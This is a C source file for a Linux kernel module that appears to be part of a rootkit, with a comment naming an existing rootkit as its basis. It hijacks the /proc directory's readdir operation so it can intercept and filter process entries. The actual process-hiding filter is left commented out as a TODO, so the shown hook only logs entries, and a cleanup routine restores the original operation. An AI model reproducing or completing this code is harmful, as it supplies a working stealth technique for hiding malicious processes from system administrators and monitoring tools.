// Based heavily on https://github.com/mfontanini/Programs-Scripts/blob/master/rootkit/rootkit.c

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/namei.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/version.h>

#include "processHider.h"
/*
Related things to manipulate to prevent rootkit being visable:
 * average cpu usage
*/

static int do_readdir_proc (struct file *fp, void *buf, filldir_t fdir);

/* Injection structs */
struct inode *pinode, *tinode, *uinode, *rcinode, *modinode;
struct proc_dir_entry *modules, *root, *handler, *tcp;
static struct file_operations proc_fops;
const struct file_operations *proc_original = 0, *modules_proc_original = 0, *tcp_proc_original = 0;
filldir_t proc_filldir, rc_filldir, mod_filldir;

unsigned hidden_pid_count = 0;
void hook_proc(struct proc_dir_entry *root);


int processHider_init(void) {
	
	static struct file_operations fileops_struct = {0};
	struct proc_dir_entry *new_proc;
	// dummy to get proc_dir_entry of /proc_create
	new_proc = proc_create("dummy", 0644, 0, &fileops_struct);
	root = new_proc->parent;
	hook_proc(root);
	
	remove_proc_entry("dummy", 0);
	
	return 0;
}

//TODO: add / info on what to hide
void hideProcess(void) {
	// from base.c 	//struct mm_struct *mm = get_task_mm(task); 
}



void hook_proc(struct proc_dir_entry *root) {
	// search for /proc's inode
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
	struct nameidata inode_data;
	if(path_lookup("/proc/", 0, &inode_data))
		return;
#else
	struct path p;
	if(kern_path("/proc/", 0, &p))
		return;
	pinode = p.dentry->d_inode;
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
	pinode = inode_data.path.dentry->d_inode;
#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
	pinode = inode_data.inode;
#endif

	if(!pinode)
		return;
	// hook /proc readdir
	proc_fops = *pinode->i_fop;
	proc_original = pinode->i_fop;
	proc_fops.readdir = do_readdir_proc;
	pinode->i_fop = &proc_fops;
}


/*
void hide_pid(unsigned pid) {
	if(hidden_pid_count < MAX_HIDDEN_PIDS && get_task_struct_by_pid(pid)) {
		//snprintf(hidden_pids[hidden_pid_count], MAX_PID_LENGTH, "%d", pid);
		if(!pid_in_array(hidden_pids, hidden_pid_count, hidden_pids[hidden_pid_count]))
			hidden_pid_count++;
	}
}
*/

int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
	
		printk(KERN_INFO "proc entry: %s\n", buffer);

		//if(!strcmp(buffer, hidden_pids[i]))
//			return 0; // hie all for now..
	// do the normal stuff...
	return proc_filldir(a, buffer, c, d, e, f);
}


static int do_readdir_proc (struct file *fp, void *buf, filldir_t fdir) {
	int ret;
	// replace the filldir_t with my own
	proc_filldir = fdir;
	ret = proc_original->readdir(fp, buf, fake_proc_fill_dir);
	return ret;
}
void processHider_exit(void) {
	if(proc_original)
		pinode->i_fop = proc_original;
}


